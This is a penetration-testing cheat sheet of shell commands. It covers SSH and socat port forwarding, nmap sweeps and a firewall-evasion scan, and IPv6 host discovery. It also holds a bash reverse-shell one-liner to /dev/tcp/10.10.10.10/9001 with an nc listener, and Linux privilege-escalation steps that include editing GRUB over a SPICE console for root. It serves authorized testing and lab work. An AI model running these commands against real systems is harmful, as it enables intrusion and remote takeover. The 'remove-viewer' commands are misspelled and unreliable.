# Technical hints

Use this [tool](https://ecotrust-canada.github.io/markdown-toc/) to build the TOC.

- [Technical hints](#technical-hints)
  * [Listen on local port 8080 and forward incoming traffic to REMOTE_HOST:PORT via SSH_SERVER](#listen-on-local-port-and-forward-incoming-traffic-to-remote-host-port-via-ssh-server)
  * [Connect to listener for a reverse shell](#connect-to-listener-for-a-reverse-shell)
  * [Setup a local listener for a reverse shell](#setup-a-local-listener-for-a-reverse-shell)
  * [See OS version/architecture on Linux](#see-os-version-architecture-on-linux)
  * [Nmap ping sweep](#nmap-ping-sweep)
  * [Nmap scan specifying a source port to bypass lazy firewall filtering](#nmap-scan-specifying-a-source-port-to-bypass-lazy-firewall-filtering)
  * [Nmap on IPv6 target](#nmap-on-ipv6-target)
  * [SCP using IPv6](#scp-using-ipv6)
  * [SSH using IPv6](#ssh-using-ipv6)
  * [Get IPv6 addresses of hosts around](#get-ipv6-addresses-of-hosts-around)
  * [List known hosts IPV6 addresses](#list-known-hosts-ipv6-addresses)
  * [List known hosts IPV4 addresses and hosts](#list-known-hosts-ipv4-addresses-and-hosts)
  * [Forward TCP traffic from SOURCE to DESTINATION using SOCAT and sent it as background task](#forward-tcp-traffic-from-source-to-destination-using-socat-and-sent-it-as-background-task)
  * [Possible ways to perform a LPE ona linux](#possible-ways-to-perform-a-lpe-ona-linux)
    + [Way 1](#way-1)
    + [Way 2](#way-2)

## Listen on local port and forward incoming traffic to REMOTE_HOST:PORT via SSH_SERVER

[Source](https://guide.offsecnewbie.com/port-forwarding-ssh-tunneling).

Scenario: access a host that's being blocked by a firewall via SSH_SERVER

```shell
ssh -L 127.0.0.1:LOCAL_PORT:REMOTE_HOST:REMOTE_PORT user@SSH_SERVER
```

## Connect to listener for a reverse shell

```shell
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'
```

## Setup a local listener for a reverse shell

```shell
nc -lnvp 9001
```

## See OS version/architecture on Linux

```shell
lsb_release -a
hostnamectl
cat /etc/os-release
```

See the script [os-info.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/os-info.sh).

## Nmap ping sweep

```shell
nmap -sP 172.31.1-255.1-255
```

See the script [ping-sweep.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/ping-sweep.sh) if it is not possible to upload a static version of nmap.

Same thing regarding the script [ports-scan.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/ports-scan.sh).

## Nmap scan specifying a source port to bypass lazy firewall filtering

Here using DNS ports because it is often allowed (no DNS resolution) and assuming that the host is alive

```shell
nmap -sS -p1-1024 -Pn -n -v --source-port 53 192.168.5.2
```

## Nmap on IPv6 target

IP is specified using `[IP]%[NETWORK_CARD_IDENTIFIER]`

```shell
nmap -6 -p 2222 --open fe80::5054:ff:fec6:7066%ens3
```

## SCP using IPv6

IP is specified between `[]`

```shell
scp -P 987 user@[fe80::5054:ff:fec6:7066%ens3]:/home/file.txt .
```

## SSH using IPv6

```shell
ssh -p2222 user@fe80::5054:ff:fec6:7066%ens3
```

## Get IPv6 addresses of hosts around

Ping the multicast IPV6 address (ff02::1) to get the IPV6 address of neighbours:

- [Source 1](https://en.wikipedia.org/wiki/Multicast_address#IPv6)
- [Source 2](https://www.menandmice.com/blog/ipv6-reference-multicast/)

*ens3* is the `[NETWORK_CARD_IDENTIFIER]`

```shell
ping6 -I ens3 ff02::1
```

 See the script [identify-neighbour-hosts.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/network-config.sh).

## List known hosts IPV6 addresses

```shell
ip -6 neigh
```

## List known hosts IPV4 addresses and hosts

In order to map corresponding IPV6 addresses based on MAC addresses and then identify hosts.

Use `arp -a` without param `-n` to see hostname.

```shell
arp -an
```

## Forward TCP traffic from SOURCE to DESTINATION using SOCAT and sent it as background task

Syntax:

```shell
socat TCP-LISTEN:SOURCE_PORT,bind=SOURCE_ADDRESS,fork,reuseaddr TCP:DESTINATION_ADDRESS:DESTINATION_PORT &
```

Example:

```shell
socat TCP-LISTEN:9002,bind=192.168.145.5,fork,reuseaddr TCP:localhost:9001 &
```

## Possible ways to perform a LPE ona linux

See [this video from IppSec](https://www.youtube.com/watch?v=LfbwlPxToBc&t=3339s).

### Way 1

Search for services listening on localhost and running as root then try to explore them...

```shell
netstat -anlp | grep LIST
```

### Way 2

Check if there is SPICE ports used.

Spice is an open remote computing solution, providing client access to remote displays and devices

The main use case is to get remote access to virtual machines.

Port example: 5800/5900 for VNC

```shell
ps -eaf | grep [PORT] #and check for SPICE port in the command line
```

Use tool like remove-viewer to access to the console (`apt install virt-viewer`)

```shell
remove-viewer spice://[TARGET_ADDRESS]:[SPICE_PORT]
```

Once on the login prompt:

1) Reboot the VM via `CTRL+ALT+DEL`.
2) Edit the GRUB to have a shell as root ([password recovery](https://linuxconfig.org/how-to-reset-kali-linux-root-password)).
3) Change the root password and then reboot the VM.
